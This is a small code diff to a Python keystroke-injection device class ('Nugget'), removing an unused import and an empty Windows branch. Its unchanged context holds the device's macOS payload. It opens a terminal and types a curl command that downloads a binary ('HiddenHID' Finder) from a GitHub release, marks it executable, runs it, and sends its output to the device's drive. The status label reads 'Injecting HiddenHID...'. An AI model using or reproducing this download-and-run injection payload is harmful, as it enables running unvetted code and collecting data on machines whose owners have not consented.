@@ -3,7 +3,6 @@ from collections import OrderedDict
 from brightnugget import BrightNugget
 from brighthid import BrightHID
 from microcontroller import reset
-from adafruit_hid.keycode import Keycode
 
 
 class Nugget(BrightNugget):
@@ -59,8 +58,6 @@ class Nugget(BrightNugget):
             self.keyboard.terminal()
             self.keyboard.update("Injecting HiddenHID...", 0)
             self.keyboard.write(f"curl \"https://github.com/Bright-Shard/HiddenHID/releases/download/latest/Finder\" -L -o Finder; chmod +x Finder; ./Finder output=/Volumes/{self.config['Drive Name']}/loaded")
-        elif self.os == "Windows":
-            self.keyboard.terminal()
 
     def switchOS(self, newOS: str):
         self.os = newOS
